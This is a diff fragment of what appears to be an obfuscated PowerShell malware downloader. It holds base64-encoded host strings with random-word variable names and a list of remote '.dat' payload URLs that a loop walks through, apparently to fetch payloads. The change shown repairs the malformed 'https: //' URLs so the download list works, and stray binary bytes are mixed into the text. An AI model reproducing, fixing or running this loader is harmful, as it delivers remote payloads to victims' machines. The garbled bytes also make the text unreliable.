@@ -18,13 +18,13 @@ $mutantDesmose = "aAB0AHQAcABzADoALwAvADEAOQAyAC4AMgAyADEALgA1ADkALgA1ADQAmaAB0A
 $Phyllopteryx = "aAB0AHQAcABzADoALwAvAEEAYgBzAHQAcgBhAGMAdABlAHMAdABBAHMAdABlAHIAbwBsAGUAcABpAHMALgByAGUAYwBpAHAAZQBzAA==YSaAB0AHQAcABzADoALwAvADYAOAAuADEAMAAwAC4AMgAzADIALgAxADMAMQA=YSaAB0AHQAcAA6AC8ALwBwAGEAbABhAG0AYQAuAGwAdABkAGEA";
 $QuakiestPyelogram = "
 http: //199.234.216.70/Rr/Wm
-    https: //noninfectingColinus.courses/eeGY/anu
-    https: //emerkas.com/GgJ8LxnheV.dat
-    https: //holikina.com/Lditm.dat
-    https: //tasirrkar.com/deFpeQ5tt.dat
-    https: //chinamoa.com/3Sknq0l3RNcC.dat
-    https: //seucurita.com/TJh048zP2LUt.dat
-    https: //aniatra.com/Mc6tLyMfIke.daté[ºÀÀ@@@À
+    https://noninfectingColinus.courses/eeGY/anu
+    https://emerkas.com/GgJ8LxnheV.dat
+    https://holikina.com/Lditm.dat
+    https://tasirrkar.com/deFpeQ5tt.dat
+    https://chinamoa.com/3Sknq0l3RNcC.dat
+    https://seucurita.com/TJh048zP2LUt.dat
+    https://aniatra.com/Mc6tLyMfIke.daté[ºÀÀ@@@À
     À @ @ ";foreach ($amentiform in $QuakiestPyelogram -split "
 _ ") {$indimensible = "
 aAB0AHQAcAA6AC8ALwB0AGkAbgBsAGkAawBlAC4AZABlAG4AdABhAGwA ";try {$kleptomaniac = "
